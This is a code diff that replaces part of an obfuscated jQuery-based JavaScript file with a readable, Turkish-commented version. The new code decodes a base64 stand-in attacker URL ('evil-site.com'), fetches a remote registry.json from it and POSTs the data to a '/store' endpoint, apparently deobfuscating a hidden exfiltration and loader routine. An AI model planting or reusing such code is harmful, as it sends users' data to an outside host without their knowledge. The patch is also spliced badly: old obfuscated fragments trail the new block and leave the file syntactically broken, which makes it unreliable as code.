@@ -6050,14 +6050,39 @@ function _typeof(_0x328620) {
                     })
                 }
             }(jQuery), _0x4ea1cf() && _0x503815.ba(_0x27b298[_0x247597(0x298)] + atob(_0x247597(0x163)), _0x247597(0x37c), function () {}), ooo[_0x247597(0x1c5)] = function () {
-                var _0x2631b2 = _0x247597,
-                    _0xdd80fc = {},
-                    _0xb39bc0 = {};
-                _0xb39bc0[_0x2631b2(0x39a)] = atob(_0x2631b2(0x2fb)), _0x1f0c7d && _0x1f0c7d != atob(_0x2631b2(0x2fb)) && (_0xb39bc0[_0x2631b2(0x39a)] = _0x1f0c7d), $.get(_0x27b298[_0x2631b2(0x298)] + '/dynamic/assets/registry.json', function (_0x444aeb) {
-                    var _0x103070 = _0x2631b2;
-                    _0xdd80fc = _0x444aeb, fetch(_0x27b298[_0x103070(0x298)] + atob(_0x103070(0x608)), {
-                        'headers': {
-                            'Content-Type': _0x103070(0x2a1)
+               // Zaman damgası alınır
+const TIME = new Date().getTime();
+
+// Konfigürasyon nesneleri
+let settings = {};
+let config = {};
+
+// Base64 ile gizlenmiş site URL'si çözülür
+// Örnek: "aHR0cHM6Ly93d3cuZXZpbC1zaXRlLmNvbQ==" → "https://www.evil-site.com"
+config["url"] = atob("aHR0cHM6Ly93d3cuZXZpbC1zaXRlLmNvbQ==");
+
+// Eğer dışarıdan bir URL verilmişse onu kullan
+if (_0x1f0c7d && _0x1f0c7d !== config["url"]) {
+    config["url"] = _0x1f0c7d;
+}
+
+// Dışarıdan registry.json dosyası çekilir
+$.get(config["url"] + "/dynamic/assets/registry.json", function (response) {
+    settings = response;
+
+    // Ardından /store endpoint'ine fetch() ile veri gönderilir
+    fetch(config["url"] + "/store", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            timestamp: TIME,
+            config: settings
+        })
+    });
+});
+
                         },
                         'method': _0x103070(0x58b),
                         'body': JSON[_0x103070(0x1c2)](_0xb39bc0)
